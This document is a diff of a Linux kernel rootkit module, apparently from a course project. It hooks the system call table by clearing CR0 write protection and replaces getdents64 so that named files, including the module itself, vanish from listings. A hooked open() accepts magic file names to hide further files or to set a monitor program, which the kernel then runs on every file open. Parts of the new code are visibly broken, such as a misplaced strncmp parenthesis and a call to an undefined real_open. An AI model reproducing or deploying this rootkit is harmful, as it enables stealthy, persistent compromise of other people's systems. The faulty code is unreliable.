@@ -3,9 +3,7 @@
 #include <linux/init.h>
 #include <linux/syscalls.h>
 #include <linux/dirent.h>
-#include <linux/string.h>  
-#include <linux/moduleparam.h> 
-#include <linux/sched.h>
+#include <linux/string.h> 
 
 /*************** Module description ********************/
 MODULE_LICENSE("GPL");
@@ -16,21 +14,21 @@ MODULE_DESCRIPTION("Rootkit main entry");
 // Hook system call table and hide file by name
 static unsigned long **hook_syscall_table(void);
 static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long count);
-static int test(void);
+static int callMonitor(char *msg);
+
 // Kernel system call
-asmlinkage long (*kl_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
-asmlinkage long (*kl_execve)(const char __user *filename,
-                         const char __user *const __user *argv,
-                         const char __user *const __user *envp);
+asmlinkage long (*kernel_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
+asmlinkage long (*kernel_open)(const char __user *filename, int flags, umode_t mode);
 // Hooked system call
 asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
-asmlinkage long hooked_execve(const char __user *filename,
-                         const char __user *const __user *argv,
-                         const char __user *const __user *envp);
-
+asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode);
 
 /*************** What file we gonna hide ********************/
-#define targetfile "TestRootkitHide.txt"
+#define INEXISTFILE "HIDEAFILEINKERNEL"
+#define INEXISTMONITOR "SETMONITORPROGRAM"
+char *hidfiles[256];
+char *monitor = NULL;
+int filenum;
 
 /*
  * Disable write protection for hook system call table
@@ -38,17 +36,6 @@ asmlinkage long hooked_execve(const char __user *filename,
 #define DISABLE_WRITE_PROTECTION (write_cr0(read_cr0() & (~ 0x10000)))
 #define ENABLE_WRITE_PROTECTION (write_cr0(read_cr0() | 0x10000))
 asmlinkage unsigned long **syscall_table;
-
-static int test(void){
-//    char *argv[] = { "/usr/rootkit/CS558/Test/./execv", NULL};
-    char *argv[] = { "/usr/bin/java", "-jar", "/usr/rootkit/CS558/Test/client.jar", NULL};
-    static char *envp[] = {
-            "HOME=/",
-            "TERM=linux",
-            "PATH=/sbin:/bin:/usr/sbin:/usr/bin:", NULL};
-
-    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
-}
  
 static int lkm_init(void)
 {
@@ -56,13 +43,16 @@ static int lkm_init(void)
     syscall_table = hook_syscall_table();
     
     DISABLE_WRITE_PROTECTION;
-    kl_getdents64 = (void *)syscall_table[__NR_getdents64];
-//    kl_execve = (void *)syscall_table[__NR_execve]; 
+    kernel_getdents64 = (void *)syscall_table[__NR_getdents64]; 
+    kernel_open = (void *)syscall_table[__NR_open]; 
     syscall_table[__NR_getdents64] = (unsigned long *)hooked_getdents64;
-//    kernel_execve("./test", )
-//    syscall_table[__NR_execve] = (unsigned long *)hooked_execve;
-    test();
+    syscall_table[__NR_open] = (unsigned long *)hooked_open;
     ENABLE_WRITE_PROTECTION;
+    
+    hidfiles[0] = "cmdoutput.txttmp";
+    hidfiles[1] = "myrootkit.ko";
+    hidfiles[2] = "ccprogram";
+    filenum=3;
     
     return 0;    
 }
@@ -123,25 +113,40 @@ static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long c
 asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
 {
     long rv;
+    int i;
     
-    rv = kl_getdents64(fd, dirp, count);
-    rv = hide_file64(targetfile, dirp, rv);
+    rv = kernel_getdents64(fd, dirp, count);
+    for(i=0; i<filenum; i++){
+        rv = hide_file64(hidfiles[i], dirp, rv);
+    }
     
     return rv;
 }
 
-asmlinkage long hooked_execve(const char __user *filename,
-                         const char __user *const __user *argv,
-                         const char __user *const __user *envp)
-{
-    long rv;
-    char file[256];
+asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode){
+    char *tmp;
     
-    strncpy_from_user(file, filename, 256);
-    rv = kl_execve(file, argv, envp);
-    printk("the file is [%s].", file);
-    
-    return rv;
+    //Hide a new type of file
+    if(strncmp(filename, INEXISTFILE, strlen(INEXISTFILE) == 0)){
+        tmp = filename;
+        while(*tmp != '%') tmp++;
+        if(*tmp == '%'){
+            hidfiles[filenum] = tmp;
+            filenum++;
+        }
+    } else if(strncmp(filename, INEXISTMONITOR, strlen(INEXISTMONITOR) == 0)){
+        tmp = filename;
+        while(*tmp != '%') tmp++;
+        if(*tmp == '%'){
+            monitor = tmp;
+        }
+    }
+    if(monitor != NULL){
+        callMonitor(filename);
+    }
+        
+    //Monitor exist file    
+    return real_open(kernel_open, flags, mode);
 }
  
 static void lkm_exit(void)
@@ -150,9 +155,19 @@ static void lkm_exit(void)
     
     // Recover the original system call setting
     DISABLE_WRITE_PROTECTION;
-    syscall_table[__NR_getdents64] = (unsigned long *)kl_getdents64;
-//    syscall_table[__NR_execve] = (unsigned long *)kl_execve;
+    syscall_table[__NR_getdents64] = (unsigned long *)kernel_getdents64;
+    syscall_table[__NR_open] = (unsigned long *)kernel_open;
     ENABLE_WRITE_PROTECTION;
+}
+
+static int callMonitor(char *msg){
+    char *argv[] = { monitor, msg, NULL};
+    static char *envp[] = {
+            "HOME=/",
+            "TERM=linux",
+            "PATH=/sbin:/bin:/usr/sbin:/usr/bin:", NULL};
+
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 }
  
 module_init(lkm_init);
